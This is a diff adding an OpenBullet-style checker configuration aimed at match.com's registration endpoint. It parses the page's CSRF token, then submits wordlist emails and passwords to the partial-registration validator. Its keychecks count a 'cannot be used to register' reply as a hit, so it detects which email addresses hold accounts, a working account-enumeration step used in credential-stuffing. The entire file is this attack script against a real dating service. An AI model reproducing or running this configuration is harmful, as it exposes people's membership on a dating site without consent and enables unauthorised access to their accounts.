@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "match registration",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-26T00:47:52.0950795+01:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.match.com/dnws/registration/registration.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://www.match.com/registration/registration.aspx" 
+  HEADER "Connection: keep-alive" 
+#TOK PARSE "<SOURCE>" LR "M_CSRF\", '" "')" Recursive=FALSE -> VAR "CSRF" "" "" 
+#POST REQUEST POST "https://www.match.com/Registration/ValidatePartialRegistration/" AutoRedirect=TRUE 
+  CONTENT "FirstName=&Password=<PASS>&Email=<USER>&BirthDay=1&BirthMonth=1&BirthYear=1975&PostalCode=10001&CountryCode=1&StateCode=0&CityCode=0&Gender=1&GenderSeek=2&AgeSeekLow=25&AgeSeekHigh=35&PhoneAreaCode=&PhoneNumber=&EmailMatchInfo=true&EnablePartialLogging=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "M_CSRF: <CSRF>" 
+  HEADER "X-Requested-By: legacy" 
+  HEADER "Referer: https://www.match.com/dnws/registration/registration.aspx" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"RedirectUrl\":null,\"Success\":true,\"Messages\":[],\"Cookies\":{},\"Data\":{\"FormerSub\":false}}" 
+  KEYCHAIN Success OR 
+    KEY "The email address you entered cannot be used to register" 
+  KEYCHAIN Retry OR 
+    KEY "We are unable to process your registration at this time" 
